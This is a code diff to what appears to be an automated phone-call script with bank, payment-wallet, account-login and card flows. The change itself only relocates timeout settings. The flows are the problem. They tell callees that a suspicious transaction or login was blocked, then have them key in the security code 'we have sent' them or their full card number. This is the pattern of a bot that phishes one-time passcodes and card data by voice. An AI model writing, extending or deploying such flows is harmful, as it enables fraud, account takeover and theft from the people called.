@@ -22,11 +22,12 @@ export const bankFlow = (
               'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'bankStepOTP',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
           onKeypressVar: 'dtmf',
         },
@@ -39,7 +40,7 @@ export const bankFlow = (
           onKeypressGoto: 'bankStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -65,12 +66,13 @@ export const bankFlow = (
               'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'bankStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -82,7 +84,7 @@ export const bankFlow = (
           onKeypressGoto: 'bankStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -107,6 +109,7 @@ export const bankFlow = (
             payload: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'bankStepGoto',
@@ -165,6 +168,7 @@ export const bankFlow = (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'bankStepGoto',
@@ -212,12 +216,13 @@ export const payFlow = (
             payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'payStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -229,7 +234,7 @@ export const payFlow = (
           onKeypressGoto: 'payStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -254,12 +259,13 @@ export const payFlow = (
             payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'payStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -271,7 +277,7 @@ export const payFlow = (
           onKeypressGoto: 'payStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -296,6 +302,7 @@ export const payFlow = (
             payload: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'payStepGoto',
@@ -353,6 +360,7 @@ export const payFlow = (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'bankStepGoto',
@@ -400,12 +408,13 @@ export const accountFlow = (
             payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'accountStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -417,7 +426,7 @@ export const accountFlow = (
           onKeypressGoto: 'accountStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -442,12 +451,13 @@ export const accountFlow = (
             payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the code yet please press the star key followed by the pound key`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'accountStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -459,7 +469,7 @@ export const accountFlow = (
           onKeypressGoto: 'accountStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -484,6 +494,7 @@ export const accountFlow = (
             payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'accountStepGoto',
@@ -541,6 +552,7 @@ export const accountFlow = (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'accountStepGoto',
@@ -588,12 +600,13 @@ export const cardFlow = (
             payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 18,
         },
         {
@@ -605,7 +618,7 @@ export const cardFlow = (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 18,
         },
         {
@@ -630,12 +643,13 @@ export const cardFlow = (
             payload: `For your SECURITY, please enter your ${cardType} card number followed by the pound key`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 18,
         },
         {
@@ -647,7 +661,7 @@ export const cardFlow = (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 18,
         },
         {
@@ -672,6 +686,7 @@ export const cardFlow = (
             payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepGoto',
@@ -729,6 +744,7 @@ export const cardFlow = (
             payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepGoto',
